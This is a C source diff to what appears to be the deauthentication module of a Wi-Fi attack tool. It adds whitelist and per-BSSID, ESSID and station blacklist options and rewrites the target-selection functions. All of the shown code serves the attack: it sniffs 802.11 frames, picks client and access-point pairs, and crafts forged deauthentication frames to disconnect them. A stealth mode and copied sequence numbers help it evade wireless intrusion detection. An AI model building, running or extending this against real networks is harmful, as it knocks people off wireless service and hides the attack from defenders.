@@ -17,8 +17,11 @@
 
 //Global things, shared by packet creation and stats printing
 struct ether_addr bssid, station;
-struct ether_addr mac_block;                 // Mac for d mode, -B, -C, -E
-unsigned char essid_block[33] = {0};               // Essid for d mode, -E
+struct ether_addr mac_block;                 // MAC for d mode, -S
+struct ether_addr bssid_block;               // MAC for d mode, -B
+struct ether_addr essid_mac_block;           // MAC for d mode, -E
+struct ether_addr white_mac;                 // white station MAC -W 
+unsigned char essid_block[33] = {0};         // essid for d mode, -E
 unsigned char essid_len;
 
 void deauth_shorthelp()
@@ -49,7 +52,9 @@ void deauth_longhelp()
 	  "      -B <AP BSSID>\n"
 	  "         Specify an AP BSSID to attack.\n"
 	  "      -S <Station MAC address>\n"
-	  "         Specify a station MAC address to attack.\n");
+	  "         Specify a station MAC address to attack.\n"
+    "      -W <Whitelist Station MAC address>\n"
+    "         Specify a whitelist station MAC.\n");
 }
 
 
@@ -63,54 +68,72 @@ void *deauth_parse(int argc, char *argv[]) {
   dopt->speed = 0;
   dopt->stealth = 0;
 
-  while ((opt = getopt(argc, argv, "w:b:s:xc:E:B:S:")) != -1) {
+  dopt->blacklist = NULL;
+  dopt->whitelist = NULL;
+
+  dopt->blacklist_from_file = 0;
+  dopt->blacklist_from_essid = 0;
+  dopt->blacklist_from_bssid = 0;
+  dopt->blacklist_from_station = 0;
+
+  dopt->whitelist_from_file = 0;
+  dopt->whitelist_from_station = 0;
+
+  while ((opt = getopt(argc, argv, "w:b:s:xc:E:B:S:W:")) != -1) {
     switch (opt) {
       case 'w':
-	if (dopt->isblacklist || dopt->greylist) {
-	  printf("Only one -w or -b may be selected once\n"); return NULL; }
-	dopt->greylist = malloc(strlen(optarg) + 1); strcpy(dopt->greylist, optarg);
+      dopt->whitelist = malloc(strlen(optarg) + 1); 
+      strcpy(dopt->whitelist, optarg);
+      dopt->whitelist_from_file = 1;
       break;
       case 'b':
-	if (dopt->isblacklist || dopt->greylist) {
-	  printf("Only one -w or -b may be selected once\n"); return NULL; }
-	dopt->greylist = malloc(strlen(optarg) + 1); strcpy(dopt->greylist, optarg);
-	dopt->isblacklist = BLACKLIST_FROM_FILE;
+      dopt->blacklist = malloc(strlen(optarg) + 1); 
+      strcpy(dopt->blacklist, optarg);
+      dopt->blacklist_from_file = 1;
       break;
       case 's':
-	dopt->speed = (unsigned int) atoi(optarg);
+	    dopt->speed = (unsigned int) atoi(optarg);
       break;
       case 'x':
-        dopt->stealth = 1;
+      dopt->stealth = 1;
       break;
       case 'c':
-	speed = 3000000;
-	speedstr = strrchr(optarg, ':');
-	if (speedstr != NULL) {
-	  speed = 1000 * atoi(speedstr + 1);
-	}
-	if (optarg[0] == 'h') {
-	  init_channel_hopper(NULL, speed);
-	} else {
-	  init_channel_hopper(optarg, speed);
-	}
+      speed = 3000000;
+      speedstr = strrchr(optarg, ':');
+      if (speedstr != NULL) {
+        speed = 1000 * atoi(speedstr + 1);
+      }
+      if (optarg[0] == 'h') {
+        init_channel_hopper(NULL, speed);
+      } else {
+        init_channel_hopper(optarg, speed);
+      }
       break;
 	  case 'E':
-	dopt->isblacklist = BLACKLIST_FROM_ESSID;
-	essid_len = strlen(optarg);
-	memcpy(essid_block, optarg, essid_len);
+  	essid_len = strlen(optarg);
+  	memcpy(essid_block, optarg, essid_len);
+    dopt->blacklist_from_essid = 1;
+    //printf("-Blacklist ESSID MAC: %s\n", optarg);
 	  break;
 	  case 'B':
-	dopt->isblacklist = BLACKLIST_FROM_BSSID;
-	mac_block = parse_mac(optarg);
+    bssid_block = parse_mac(optarg);
+    dopt->blacklist_from_bssid = 1;
+    //printf("-Blacklist BSSID MAC: %s\n", optarg);
 	  break;
 	  case 'S':
-	dopt->isblacklist = BLACKLIST_FROM_STATION;
-	mac_block = parse_mac(optarg);
+  	mac_block = parse_mac(optarg);
+    dopt->blacklist_from_station = 1;
+    //printf("-Blacklist Station MAC: %s\n", optarg);
 	  break;
-      default:
-	deauth_longhelp();
-	printf("\n\nUnknown option %c\n", opt);
-	return NULL;
+    case 'W':
+    white_mac = parse_mac(optarg);
+    dopt->whitelist_from_station = 1;
+    //printf("-Whitelist Station MAC: %s\n", optarg);
+    break;
+    default:
+  	deauth_longhelp();
+  	printf("\n\nUnknown option %c\n", opt);
+  	return NULL;
     }
   }
 
@@ -176,6 +199,105 @@ unsigned char accept_target(struct packet *pkt, unsigned char isblacklist, char 
   return 0;
 }
 
+unsigned char accept_target1(struct packet *pkt, struct deauth_options *dopt) {
+  struct ieee_hdr *hdr = (struct ieee_hdr *) pkt->data;
+
+  //if (! greylist) return 1; //Always accept when no black/whitelisting selected
+  if(dopt->blacklist_from_file == 0 && dopt->blacklist_from_essid == 0 && 
+    dopt->blacklist_from_bssid == 0 && dopt->blacklist_from_station == 0 &&
+    dopt->whitelist_from_file == 0 && dopt->whitelist_from_station == 0)
+    return 1;
+
+  if(MAC_IS_BCAST(hdr->addr1))
+    return 0;
+
+  // If any of the Adresses is Blacklisted, ACCEPT target
+  if (dopt->blacklist_from_file == 1) {
+    if (is_blacklisted(hdr->addr1)) return 1;
+    if (is_blacklisted(hdr->addr2)) return 1;
+    if (is_blacklisted(hdr->addr3)) return 1;
+  }
+
+  if(dopt->blacklist_from_bssid == 1 && dopt->blacklist_from_station == 1)
+  {
+    if((MAC_MATCHES(bssid_block, hdr->addr1) || MAC_MATCHES(bssid_block, hdr->addr2) || MAC_MATCHES(bssid_block, hdr->addr3)) &&
+      (MAC_MATCHES(mac_block, hdr->addr1) || MAC_MATCHES(mac_block, hdr->addr2) || MAC_MATCHES(mac_block, hdr->addr3)))
+    {
+      return 1;
+    }
+
+    return 0;
+  }
+
+  if(dopt->blacklist_from_essid == 1 && dopt->blacklist_from_station == 1)
+  {
+    if((MAC_MATCHES(essid_mac_block, hdr->addr1) || MAC_MATCHES(essid_mac_block, hdr->addr2) || MAC_MATCHES(essid_mac_block, hdr->addr3)) &&
+      (MAC_MATCHES(mac_block, hdr->addr1) || MAC_MATCHES(mac_block, hdr->addr2) || MAC_MATCHES(mac_block, hdr->addr3)))
+    {
+      return 1;
+    }
+
+    return 0;
+  }
+
+  if(dopt->blacklist_from_bssid == 1)
+  {
+   if(MAC_MATCHES(bssid_block, hdr->addr1) || MAC_MATCHES(bssid_block, hdr->addr2) || MAC_MATCHES(bssid_block, hdr->addr3))
+   {
+      if(dopt->whitelist_from_station == 1)
+      {
+        if(MAC_MATCHES(white_mac, hdr->addr1) || MAC_MATCHES(white_mac, hdr->addr2) || MAC_MATCHES(white_mac, hdr->addr3))
+          return 0;
+      }
+
+      if(dopt->whitelist_from_file == 1)
+      {
+        if (is_whitelisted(hdr->addr1)) return 0;
+        if (is_whitelisted(hdr->addr2)) return 0;
+        if (is_whitelisted(hdr->addr3)) return 0;
+        if ((hdr->flags & 0x03) == 0x03) { //WDS...
+          struct ether_addr *fourth = get_source(pkt);
+          if (is_whitelisted(*fourth)) return 0;
+        }
+      }
+
+      return 1;
+    }
+  }
+
+  if(dopt->blacklist_from_essid == 1)
+  {
+     if(MAC_MATCHES(essid_mac_block, hdr->addr1) || MAC_MATCHES(essid_mac_block, hdr->addr2) || MAC_MATCHES(essid_mac_block, hdr->addr3))
+     {
+        if(dopt->whitelist_from_station == 1)
+        {
+          if(MAC_MATCHES(white_mac, hdr->addr1) || MAC_MATCHES(white_mac, hdr->addr2) || MAC_MATCHES(white_mac, hdr->addr3))
+            return 0;
+        }
+
+        if(dopt->whitelist_from_file == 1)
+        {
+          if (is_whitelisted(hdr->addr1)) return 0;
+          if (is_whitelisted(hdr->addr2)) return 0;
+          if (is_whitelisted(hdr->addr3)) return 0;
+          if ((hdr->flags & 0x03) == 0x03) { //WDS...
+            struct ether_addr *fourth = get_source(pkt);
+            if (is_whitelisted(*fourth)) return 0;
+          }
+        }
+
+        return 1;
+     }
+  }
+
+  if(dopt->blacklist_from_station == 1)
+  {
+      if(MAC_MATCHES(mac_block, hdr->addr1) || MAC_MATCHES(mac_block, hdr->addr2) || MAC_MATCHES(mac_block, hdr->addr3))
+        return 1;
+  }
+  
+  return 0;
+}
 
 unsigned char get_new_target(struct ether_addr *client, struct ether_addr *ap, unsigned char isblacklist, char *greylist, int stealth) {
   struct packet sniffed;
@@ -235,13 +357,77 @@ unsigned char get_new_target(struct ether_addr *client, struct ether_addr *ap, u
   return wds;
 }
 
+unsigned char get_new_target1(struct ether_addr *client, struct ether_addr *ap, struct deauth_options *dopt) {
+  struct packet sniffed;
+  struct ieee_hdr *hdr;
+  unsigned char wds = 0;
+
+  if(dopt == NULL)
+    return wds;
+
+  while(1) {
+    sniffed = osdep_read_packet();
+    if (sniffed.len == 0) exit(-1);
+
+    hdr = (struct ieee_hdr *) sniffed.data;
+
+  if(dopt->blacklist_from_essid == 1){
+    if(hdr->type == IEEE80211_TYPE_BEACON){
+        if(! memcmp(sniffed.data+38, essid_block, sniffed.data[37])){
+        memcpy(essid_mac_block.ether_addr_octet, sniffed.data + 16, ETHER_ADDR_LEN);
+      }
+    }
+  }
+
+    if ((hdr->type != IEEE80211_TYPE_DATA) &&
+  /*(hdr->type != IEEE80211_TYPE_QOSDATA) &&*/
+  (hdr->type != IEEE80211_TYPE_NULL) &&
+  (hdr->type != IEEE80211_TYPE_AUTH) &&
+  (hdr->type != IEEE80211_TYPE_ASSOCREQ) &&
+  (hdr->type != IEEE80211_TYPE_ASSOCRES) &&
+  (hdr->type != IEEE80211_TYPE_REASSOCREQ))
+    continue;
+
+    if (dopt->stealth && ((hdr->flags & 0x03) != 0x01)) continue; //In stealth mode do not impersonate AP, IDS will figure out the duplicate SEQ number!
+
+    if (accept_target1(&sniffed, dopt)) break;
+  }
+
+  switch (hdr->flags & 0x03) {
+    case 0x03: //WDS
+      wds = 1;
+      MAC_COPY(*client, hdr->addr1);
+      MAC_COPY(*ap, hdr->addr2);
+    break;
+    case 0x01: //ToDS
+      MAC_COPY(*client, hdr->addr2);
+      MAC_COPY(*ap, hdr->addr1);
+    break;
+    case 0x02: //FromDS
+      if(hdr->type == IEEE80211_TYPE_DATA)
+        MAC_COPY(*client, hdr->addr3);
+      else
+        MAC_COPY(*client, hdr->addr1);
+      MAC_COPY(*ap, hdr->addr2);
+    break;
+    case 0x00: //NoDS (AdHoc)
+      MAC_COPY(*client, hdr->addr2);
+      MAC_COPY(*ap, hdr->addr3);
+    break;
+  }
+
+  set_seqno(NULL, get_seqno(&sniffed));  // Eff you, WIDS
+
+  return wds;
+}
+
 
 struct packet deauth_getpacket(void *options) {
   struct deauth_options *dopt = (struct deauth_options *) options;
   static time_t t_prev = 0;
   static unsigned char wds, state = 0;
 
-  if (dopt->greylist) {
+  /*if (dopt->greylist) {
     if (t_prev == 0) {
       printf("Periodically re-reading blacklist/whitelist every %d seconds\n\n", LIST_REREAD_PERIOD);
     }
@@ -249,13 +435,31 @@ struct packet deauth_getpacket(void *options) {
       t_prev = time(NULL);
       load_greylist(dopt->isblacklist, dopt->greylist);
     }
+  }*/
+
+  if (t_prev == 0) {
+    if(dopt->blacklist || dopt->whitelist)
+      printf("Periodically re-reading blacklist/whitelist every %d seconds\n\n", LIST_REREAD_PERIOD);
+  }
+  if ((time(NULL) - t_prev) >= LIST_REREAD_PERIOD) {
+    t_prev = time(NULL);
+
+    if(dopt->blacklist){
+      load_blacklist(dopt->blacklist);
+    }
+
+    if(dopt->whitelist){
+      load_whitelist(dopt->whitelist);
+    }
+    
   }
 
   if (dopt->speed) sleep_till_next_packet(dopt->speed);
 
   switch (state) {
     case 0:
-      wds = get_new_target(&station, &bssid, dopt->isblacklist, dopt->greylist, dopt->stealth);
+      //wds = get_new_target(&station, &bssid, dopt->isblacklist, dopt->greylist, dopt->stealth);
+      wds = get_new_target1(&station, &bssid, dopt);
       state = 1;
       return create_deauth(bssid, station, bssid);
     break;
